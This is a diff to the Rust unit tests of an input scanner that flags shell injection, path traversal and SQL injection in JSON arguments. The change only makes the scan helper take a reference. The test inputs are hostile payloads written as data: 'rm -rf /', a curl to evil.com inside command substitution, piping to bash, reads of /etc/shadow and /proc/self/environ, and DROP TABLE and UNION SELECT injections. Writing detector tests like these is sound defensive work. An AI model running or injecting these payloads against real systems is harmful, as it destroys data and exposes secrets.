@@ -163,7 +163,7 @@ mod tests {
         InputScanner::new()
     }
 
-    fn scan(args: Value) -> Vec<Finding> {
+    fn scan(args: &Value) -> Vec<Finding> {
         let map = args.as_object().unwrap().clone();
         scanner().scan_args(&map)
     }
@@ -172,7 +172,7 @@ mod tests {
 
     #[test]
     fn detects_shell_injection_semicolon() {
-        let findings = scan(json!({ "cmd": "; rm -rf / " }));
+        let findings = scan(&json!({ "cmd": "; rm -rf / " }));
         assert!(
             findings
                 .iter()
@@ -182,7 +182,7 @@ mod tests {
 
     #[test]
     fn detects_shell_injection_backtick() {
-        let findings = scan(json!({ "cmd": "`whoami`" }));
+        let findings = scan(&json!({ "cmd": "`whoami`" }));
         assert!(
             findings
                 .iter()
@@ -192,7 +192,7 @@ mod tests {
 
     #[test]
     fn detects_command_substitution() {
-        let findings = scan(json!({ "arg": "$(curl http://evil.com)" }));
+        let findings = scan(&json!({ "arg": "$(curl http://evil.com)" }));
         assert!(
             findings
                 .iter()
@@ -202,7 +202,7 @@ mod tests {
 
     #[test]
     fn detects_pipe_to_shell() {
-        let findings = scan(json!({ "data": "echo foo | bash" }));
+        let findings = scan(&json!({ "data": "echo foo | bash" }));
         assert!(
             findings
                 .iter()
@@ -212,7 +212,7 @@ mod tests {
 
     #[test]
     fn detects_chained_destructive_command() {
-        let findings = scan(json!({ "input": "normal && rm -f log.txt " }));
+        let findings = scan(&json!({ "input": "normal && rm -f log.txt " }));
         assert!(
             findings
                 .iter()
@@ -222,7 +222,7 @@ mod tests {
 
     #[test]
     fn detects_redirect_to_system_path() {
-        let findings = scan(json!({ "out": "data > /etc/crontab" }));
+        let findings = scan(&json!({ "out": "data > /etc/crontab" }));
         assert!(
             findings
                 .iter()
@@ -234,7 +234,7 @@ mod tests {
 
     #[test]
     fn detects_path_traversal_basic() {
-        let findings = scan(json!({ "path": "../../../etc/passwd" }));
+        let findings = scan(&json!({ "path": "../../../etc/passwd" }));
         assert!(
             findings
                 .iter()
@@ -244,7 +244,7 @@ mod tests {
 
     #[test]
     fn detects_url_encoded_traversal() {
-        let findings = scan(json!({ "file": "..%2f..%2fetc%2fshadow" }));
+        let findings = scan(&json!({ "file": "..%2f..%2fetc%2fshadow" }));
         assert!(
             findings
                 .iter()
@@ -254,7 +254,7 @@ mod tests {
 
     #[test]
     fn detects_sensitive_system_file() {
-        let findings = scan(json!({ "target": "/etc/passwd" }));
+        let findings = scan(&json!({ "target": "/etc/passwd" }));
         assert!(
             findings
                 .iter()
@@ -264,7 +264,7 @@ mod tests {
 
     #[test]
     fn detects_proc_self_access() {
-        let findings = scan(json!({ "path": "/proc/self/environ" }));
+        let findings = scan(&json!({ "path": "/proc/self/environ" }));
         assert!(
             findings
                 .iter()
@@ -276,7 +276,7 @@ mod tests {
 
     #[test]
     fn detects_sql_tautology() {
-        let findings = scan(json!({ "q": "' OR 1=1" }));
+        let findings = scan(&json!({ "q": "' OR 1=1" }));
         assert!(
             findings
                 .iter()
@@ -286,7 +286,7 @@ mod tests {
 
     #[test]
     fn detects_stacked_query() {
-        let findings = scan(json!({ "id": "1; DROP TABLE users" }));
+        let findings = scan(&json!({ "id": "1; DROP TABLE users" }));
         assert!(
             findings
                 .iter()
@@ -296,7 +296,7 @@ mod tests {
 
     #[test]
     fn detects_union_select() {
-        let findings = scan(json!({ "q": "foo UNION SELECT * FROM passwords" }));
+        let findings = scan(&json!({ "q": "foo UNION SELECT * FROM passwords" }));
         assert!(
             findings
                 .iter()
@@ -308,7 +308,7 @@ mod tests {
 
     #[test]
     fn clean_args_produce_no_findings() {
-        let findings = scan(json!({
+        let findings = scan(&json!({
             "name": "Alice",
             "count": 42,
             "tags": ["rust", "security"],
@@ -324,7 +324,7 @@ mod tests {
 
     #[test]
     fn nested_json_scanned_recursively() {
-        let findings = scan(json!({
+        let findings = scan(&json!({
             "outer": {
                 "inner": "; rm -rf / "
             }
@@ -338,7 +338,7 @@ mod tests {
 
     #[test]
     fn array_values_scanned_recursively() {
-        let findings = scan(json!({
+        let findings = scan(&json!({
             "commands": ["; rm -rf / ", "normal"]
         }));
         assert!(
@@ -352,7 +352,7 @@ mod tests {
 
     #[test]
     fn shell_injection_has_high_severity() {
-        let findings = scan(json!({ "cmd": "; rm -rf / " }));
+        let findings = scan(&json!({ "cmd": "; rm -rf / " }));
         let f = findings
             .iter()
             .find(|f| f.scan_type == ScanType::ShellInjection)
@@ -362,7 +362,7 @@ mod tests {
 
     #[test]
     fn sql_injection_has_medium_severity() {
-        let findings = scan(json!({ "q": "' OR 1=1" }));
+        let findings = scan(&json!({ "q": "' OR 1=1" }));
         let f = findings
             .iter()
             .find(|f| f.scan_type == ScanType::SqlInjection)
@@ -372,7 +372,7 @@ mod tests {
 
     #[test]
     fn path_traversal_has_high_severity() {
-        let findings = scan(json!({ "path": "../../../etc/passwd" }));
+        let findings = scan(&json!({ "path": "../../../etc/passwd" }));
         let f = findings
             .iter()
             .find(|f| f.scan_type == ScanType::PathTraversal)
